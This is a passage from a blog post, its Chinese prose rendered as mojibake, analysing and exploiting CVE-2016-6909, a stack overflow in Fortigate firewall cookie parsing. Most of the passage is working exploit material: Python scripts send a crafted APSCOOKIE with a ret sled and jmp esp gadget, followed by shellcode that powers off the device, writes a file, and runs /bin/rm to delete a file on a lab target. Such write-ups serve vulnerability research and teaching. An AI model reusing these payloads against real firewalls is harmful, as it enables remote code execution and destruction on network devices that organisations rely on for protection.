<p>åš pwn çš„åŒå­¦åº”è¯¥<strong>ç¬¬ä¸€çœ¼å°±èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªå¤§å¤§çš„ %s æ˜ å…¥ä½ çš„çœ¼å¸˜ï¼Œååˆ†æ˜æ˜¾çš„ä¸€ä¸ªæ ˆæº¢å‡º</strong>ï¼Œæˆ‘ä»¬çš„æ¼æ´ä¾¿ä½äºè¿™ä¸ªä½ç½®ï¼šå¯¹ Cookie å†…å®¹çš„è§£æä½¿ç”¨äº†ä¸å®‰å…¨çš„ <code>%s</code> è¯»å– AuthHash åˆ°æ ˆä¸Šä»è€Œä½¿å¾—å…¶å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p>
<blockquote>
<p>è¿™ä¸ªå¹´ä»£è¿˜æœ‰é’ˆå¯¹ <code>%s</code> çš„æ¼æ´å±å®ä»¤äººæ³ªç›®</p>
</blockquote>
<h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>httpsd ä¸ºå¯¹ init çš„è½¯é“¾æ¥ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆå¯¹ init ç¨‹åºè¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec ./init</span><br>[*] &#x27;/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br>    RPATH:    b&#x27;../lib:../ulib:/fortidev/lib:/lib&#x27;<br></code></pre></td></tr></table></figure>

<p><strong>ä¿  æŠ¤  å…¨  å…³</strong>ï¼Œæˆ‘ä»¬æœ‰ç›¸å½“å¤§çš„æ“ä½œç©ºé—´</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ç”±äºå…¶ä¸ä¼ ç»Ÿ pwn é¢˜çš„äº¤äº’ç•Œé¢ä¸åŒï¼Œæˆ‘ä»¬åªæœ‰ä¸€æ¬¡ post çš„æœºä¼šï¼Œæ‰€ä»¥éœ€è¦åœ¨è¿™ä¸€æ¬¡ post ä¸­<strong>ä¸€  æ­¥  åˆ°  ä½</strong>ï¼Œç›¸åº”åœ°ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•é€šè¿‡äº¤äº’è·å– libcï¼Œä½†æ˜¯åœ¨ init æ–‡ä»¶ä¸­æœ‰ç€å¤§é‡çš„ gadgetï¼Œåˆæ²¡å¼€ PIEï¼Œæ•…ç›´æ¥ ret2text å³å¯</p>
<p>å…ˆè¯•ä¸€ä¸‹æˆ‘ä»¬æ˜¯å¦çœŸçš„èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œéšä¾¿æ‰¾ä¸€æ®µ gadget ç®€å•è¯•ä¸€ä¸‹ï¼Œç¬”è€…è¿™é‡Œé€‰ç”¨äº†ä¸€æ®µå…³æœºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080601AE                 push    4321FEDCh       ; howto<br>.text:080601B3                 call    _reboot<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>reboot(RB_POWER_OFF)</code></p>
</blockquote>
<p>http è¯·æ±‚å¤´çš„é•¿åº¦æ¯«æ— ç–‘é—®èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬å¯¹ payload çš„è¦æ±‚ï¼Œæ•…ç¬”è€…è¿™é‡Œç›´æ¥ä½¿ç”¨å¤§é‡çš„ <code>ret</code> æŒ‡ä»¤ä½œä¸º slide codeï¼Œçœå»è®¡ç®—æº¢å‡ºé•¿åº¦çš„å¿…è¦ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#e = ELF(&#x27;./init&#x27;)</span><br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="hljs-string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="hljs-number">100</span> + <span class="hljs-string">&#x27;\xae\x01\x06\x08&#x27;</span><br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç° fortigate VM è¢«æˆåŠŸå…³æœºï¼š</p>
<blockquote>
<p>å¥½åƒæ²¡å•¥æ„ä¹‰çš„æˆªå›¾ï¼ˆï¼‰</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/NDWXjeBoVsZla8U.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ROPé“¾çš„æ‹¼æ¥è¾ƒä¸ºç¹çï¼Œä¸”å¯¹äº <code>%s</code> è€Œè¨€<strong>ç©ºç™½å­—ç¬¦æ— æ³•è¢«æ•è·</strong>ï¼Œç”±äºæ²¡æœ‰å¼€å¯ NX ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡<code>jmp esp</code> çš„ gadget æ¥<strong>ç›´æ¥æ‰§è¡Œ shellcode</strong></p>
<p>å½“ç„¶ï¼Œæœ‰çš„åŠŸèƒ½å…¶å®è¿˜æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨ init æ–‡ä»¶ä¸­å­˜åœ¨çš„å‡½æ•°çš„ï¼Œæ¯”å¦‚è¯´ open å’Œ write</p>
<p><img src="https://i.loli.net/2021/08/14/fr8sKmHFYdP6u5R.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/14/KDIwvXnT2OCMGsi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¸‹é¢è¿™æ®µä»£ç è°ƒç”¨äº† open è¿›è¡Œäº†æ–‡ä»¶çš„åˆ›å»ºå¹¶å‘æ–‡ä»¶å†…å†™å…¥äº†å­—ç¬¦ä¸² <code>arttnba3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#e = ELF(&#x27;./init&#x27;)</span><br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>cookie = <span class="hljs-string">&#x27;&#x27;</span><br>cookie += <span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span><br>cookie += <span class="hljs-string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="hljs-number">100</span> <span class="hljs-comment"># ret</span><br>cookie += <span class="hljs-string">&#x27;\xf7\xbd\x96\x08&#x27;</span> <span class="hljs-comment"># add eax, ebp ; jmp esp</span><br><span class="hljs-comment"># following are shellcode</span><br>cookie += <span class="hljs-string">&#x27;\x90&#x27;</span> * <span class="hljs-number">0x80</span> <span class="hljs-comment"># slide code nop</span><br>cookie += <span class="hljs-string">&#x27;1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3&#x27;</span> <span class="hljs-comment"># &#x27;xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:cookie<br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<p>å‘é€ http è¯·æ±‚ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨é˜²ç«å¢™å†…åˆ›å»ºæ–‡ä»¶å¹¶å†™å…¥ç‰¹å®šå†…å®¹</p>
<p><img src="https://i.loli.net/2021/08/14/yWfmvxl4DKPBGc1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¸‹åˆ— shellcode é€šè¿‡ç³»ç»Ÿè°ƒç”¨ execve è°ƒç”¨ <code>/bin/rm</code> åˆ é™¤æˆ‘ä»¬çš„ flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br>cookie += <span class="hljs-string">&#x27;1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80&#x27;</span> <span class="hljs-comment"># &#x27;xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80&#x27;</span><br>...<br></code></pre></td></tr></table></figure>

<p>å‘é€ http è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ° flag æ–‡ä»¶å·²è¢«åˆ é™¤</p>
<p><img src="https://i.loli.net/2021/08/14/I2PUGYa5TSoXuvN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨è‡ªå·±æ„é€ çš„ shellcode ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤š shellcode ç”Ÿæˆå·¥å…·ï¼Œè¿™é‡Œç¬”è€…ä¾¿ä¸å†ç‹¬ç«‹è´´å‡ºå…¶ä»– shellcode äº†</p>
<h1 id="0x03-Whatâ€™s-moreâ€¦"><a href="#0x03-Whatâ€™s-moreâ€¦" class="headerlink" title="0x03.Whatâ€™s moreâ€¦"></a>0x03.Whatâ€™s moreâ€¦</h1><p>å®‰å…¨äº§å“æ˜¯ä¸ºäº†ç¡®ä¿å®‰å…¨è€Œå¼•å…¥çš„ï¼Œä½†å®‰å…¨äº§å“åˆä¼šæœ‰æ–°çš„å®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™åˆè¦å¼•å…¥æ–°çš„å®‰å…¨äº§å“æ¥ç¡®ä¿å®‰å…¨äº§å“çš„å®‰å…¨ï¼Œç„¶åä¾¿æ˜¯æ— é™å¥—å¨ƒâ€¦</p>
<p>ç¬”è€…è®¤ä¸ºï¼Œ<strong>ã€Œå®‰å…¨é—®é¢˜æœ¬è´¨ä¸Šè¿˜æ˜¯äººçš„é—®é¢˜ã€</strong>ï¼Œåªæœ‰æˆ‘ä»¬æ¯ä¸€ä½å¼€å‘è€…éƒ½çœŸæ­£é‡è§†èµ·å®‰å…¨é—®é¢˜ï¼Œå¾ˆå¤šæ²¡æœ‰å¿…è¦çš„æŸå¤±æ‰èƒ½å¾—ä»¥é¿å…</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/ret2text/">#ret2text</a>
      
        <a href="/tags/ROP/">#ROP</a>
      
        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#æ ˆæº¢å‡º</a>
      
        <a href="/tags/shellcode/">#shellcode</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/ret2shellcode/">#ret2shellcode</a>
      
        <a href="/tags/Fortigate/">#Fortigate</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´åˆ†æåŠåˆ©ç”¨</div>
      <div>http://example.com/2021/08/10/CVE-0X03-CVE-2016-6909/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2021å¹´8æœˆ10æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/17/CVE-0X04-CVE-2020-27867/" title="ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´åˆ†æåŠåˆ©ç”¨">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´åˆ†æåŠåˆ©ç”¨</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" title="ã€CVE.0x02ã€‘CVE-2017-5123 waitid æ¼æ´åˆ†æåŠåˆ©ç”¨">
                        <span class="hidden-mobile">ã€CVE.0x02ã€‘CVE-2017-5123 waitid æ¼æ´åˆ†æåŠåˆ©ç”¨</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
    <!-- å¤‡æ¡ˆä¿¡æ¯ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      æ¡‚ICPå¤‡2022005068å·-1
    </a>
  </span>
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
